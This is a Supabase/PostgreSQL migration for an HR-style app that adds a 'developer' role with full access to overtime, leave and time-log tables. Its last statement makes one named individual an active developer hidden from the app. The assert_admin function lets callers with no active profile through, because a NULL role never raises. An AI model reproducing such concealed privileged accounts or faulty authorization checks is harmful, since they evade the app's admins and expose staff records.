alter table public.profiles
  add column if not exists is_hidden_from_app boolean not null default false;

create index if not exists idx_profiles_hidden_access
  on public.profiles (is_hidden_from_app, access_status);

drop policy if exists "Admins can update all profiles" on public.profiles;

create policy "Admins can update all profiles"
on public.profiles
for update
to authenticated
using (
  exists (
    select 1
    from public.profiles requester
    where requester.id = auth.uid()
      and requester.role in ('admin', 'developer')
      and requester.access_status = 'active'
  )
)
with check (
  exists (
    select 1
    from public.profiles requester
    where requester.id = auth.uid()
      and requester.role in ('admin', 'developer')
      and requester.access_status = 'active'
  )
);

drop policy if exists "Developers can manage all OT requests" on public.ot_requests;
create policy "Developers can manage all OT requests"
on public.ot_requests
for all
to authenticated
using (
  exists (
    select 1 from public.profiles requester
    where requester.id = auth.uid()
      and requester.role = 'developer'
      and requester.access_status = 'active'
  )
)
with check (
  exists (
    select 1 from public.profiles requester
    where requester.id = auth.uid()
      and requester.role = 'developer'
      and requester.access_status = 'active'
  )
);

drop policy if exists "Developers can manage all leave requests" on public.leave_requests;
create policy "Developers can manage all leave requests"
on public.leave_requests
for all
to authenticated
using (
  exists (
    select 1 from public.profiles requester
    where requester.id = auth.uid()
      and requester.role = 'developer'
      and requester.access_status = 'active'
  )
)
with check (
  exists (
    select 1 from public.profiles requester
    where requester.id = auth.uid()
      and requester.role = 'developer'
      and requester.access_status = 'active'
  )
);

drop policy if exists "Developers can manage all time logs" on public.daily_time_logs;
create policy "Developers can manage all time logs"
on public.daily_time_logs
for all
to authenticated
using (
  exists (
    select 1 from public.profiles requester
    where requester.id = auth.uid()
      and requester.role = 'developer'
      and requester.access_status = 'active'
  )
)
with check (
  exists (
    select 1 from public.profiles requester
    where requester.id = auth.uid()
      and requester.role = 'developer'
      and requester.access_status = 'active'
  )
);

create or replace function public.protect_profile_access_fields()
returns trigger
language plpgsql
security definer
set search_path = public
as $$
declare
  requester_role text;
begin
  if current_user in ('postgres', 'service_role', 'supabase_admin') then
    return new;
  end if;

  select role
  into requester_role
  from public.profiles
  where id = auth.uid()
    and access_status = 'active';

  if requester_role in ('admin', 'developer') then
    return new;
  end if;

  if new.role is distinct from old.role
    or new.access_status is distinct from old.access_status
    or new.is_hidden_from_app is distinct from old.is_hidden_from_app
    or new.approved_at is distinct from old.approved_at
    or new.approved_by is distinct from old.approved_by
    or new.suspended_at is distinct from old.suspended_at
    or new.suspended_by is distinct from old.suspended_by
    or new.suspend_reason is distinct from old.suspend_reason
  then
    raise exception 'Only active admins can update profile access fields';
  end if;

  return new;
end;
$$;

create or replace view public.profiles_with_avatar as
select
  p.id,
  p.first_name,
  p.last_name,
  p.department,
  p.role,
  p.created_at,
  p.updated_at,
  (u.raw_user_meta_data ->> 'avatar_url'::text) as avatar_url,
  p.access_status,
  p.approved_at,
  p.approved_by,
  p.suspended_at,
  p.suspended_by,
  p.suspend_reason,
  p.is_hidden_from_app
from public.profiles p
join auth.users u on u.id = p.id;

create or replace function public.assert_admin()
returns void
language plpgsql
security definer
set search_path = public
as $$
declare
  requester_role text;
begin
  select role
    into requester_role
    from public.profiles
   where id = auth.uid()
     and access_status = 'active';

  if requester_role not in ('admin', 'developer') then
    raise exception 'Only admins can perform this action.';
  end if;
end;
$$;

update public.profiles
set
  role = 'developer',
  access_status = 'active',
  is_hidden_from_app = true,
  updated_at = now()
where lower(first_name) = 'eakarthit'
  and lower(last_name) = 'hekhunthod';
